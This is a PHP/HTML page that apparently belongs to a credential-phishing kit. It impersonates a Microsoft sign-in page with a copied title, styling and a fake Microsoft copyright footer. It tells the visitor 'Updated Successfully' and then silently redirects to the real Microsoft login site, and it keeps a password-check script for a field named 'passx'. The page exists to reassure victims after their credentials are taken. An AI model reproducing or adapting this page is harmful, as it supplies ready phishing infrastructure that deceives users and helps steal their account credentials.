<?php
session_start();
?>
<!DOCTYPE html>
<html>
<head>
	<title>Sign in to your Microsoft account</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width">
	<link rel="icon" type="image/png" href="favicon.ico" />
	<link rel="stylesheet" type="text/css" href="style2.css">
	<style>
		form#multiphase{padding:34px; width:410px; height:310px;}
		form#multiphase > #user,#phase2{ display:none; }
		#body{
	height: 700px;
	padding: 0;
	margin: 0;
	background: url(bck.jpg);
	background-repeat: no-repeat;
	background-size: 100% 100%;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
}

#email:focus { 
    border-right: none;
    border-left: none;
    border-top: none;
}
*{
	margin: 0;
	padding: 0;
}
body{
	margin: 0;
	padding: 0;
	overflow: hidden;
	font-family: Helvetica, Ariel, sans-serif;
}
a{
	text-decoration: none;
	font-size: 14px;
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
	 
}
input{
	height: 35px;
}
h1{
	font-weight: lighter;
	font-size: 20px;
	color: #404040FF;
	margin-top: 20px;
}
p{
	font-size: 14px;
}
button{
	margin-top: 25px;
	border: none;
	background: #006EBCFF;
	color: white;
	font-size: 16px;
	cursor: pointer;
}
button:hover{
	background: #0079D1FF;
}
input [type="checkbox"]{

}
input[type="email"],
input[type="password"]{
	width: 350px;
	padding-left: 10px;
	font-size: 16px;
	margin-top: 10px;
	border-right: none;
	border-left: none;
	border-top: none;
	outline: none;
	border-bottom: 0.7px solid black;
}
#phase1 button{
	width: 363px;
	height: 40px;
	margin-bottom: 20px;
}
#phase2 button{
	width: 179px;
	height: 40px;
	margin-
}
#fd-body{
	background: #000000B6;
	width: 100%;
	height: 100%;
}
#phase1,#phase2,#float-box img{ 
	margin: 0;
	padding: 0;
}
#float-box img{
	margin-bottom: 10px;
}
#float-box{
	height: auto;
	width: 450px;
	color:#000;
	position: absolute;
	left: 35%;
	bottom: 45%;
	padding: 0;
	margin: 0;
}
#multiphase{
	padding: 0;
	margin: 0;
	background: 
}
#user{
	width: 365px;
	height: 30px;
	margin: 0;
	padding: 0;
	background: #E5E5E5FF;
}
#user img{
	margin-top: -9px;
	float: left;
}
#footer{
	background: #000000BD;
}
#footer-div{
	width: 450px;
	height: 

}
	</style>

	<script type="text/javascript">
                                   window.setTimeout(function(){location.href = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1570957799&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fRpsCsrfState%3d1b3e9c62-3a39-019a-914e-f0c8399e0343&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015"},5000)
                                </script>
</head>
<body>

	<div id="body">
	<div id="fd-body">
		<div id="float-box">
			
			<div style="margin: 50px;">
				<center>
					<img src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg" width="70">
				</center>
				<i class="fas fa-check-circle fa-3x text-success"> <font face="Trebuchet MS" color="green" size="4">Updated Successfully</font> </i>
			</div>


		<script>
 function validateForm() {
  var x = document.forms["multiphase"]["passx"].value;

  if (x == "") {
   document.getElementById("demo").innerHTML = "<div style='color: red;'><br>Please enter the password for your Microsoft account.</div>";

    return false;
  }
}


</script> 

		</div>
	</div>
	</div>
	<div id="footer">
		<div id="footer-div">
			<p>&copy;2018 Microsoft</p>
			<a href="#">Terms of use</a>
			<a href="#">Privacy & cookies</a>
			<a href="#"></a>
		</div>
	</div>
</body>
</html>
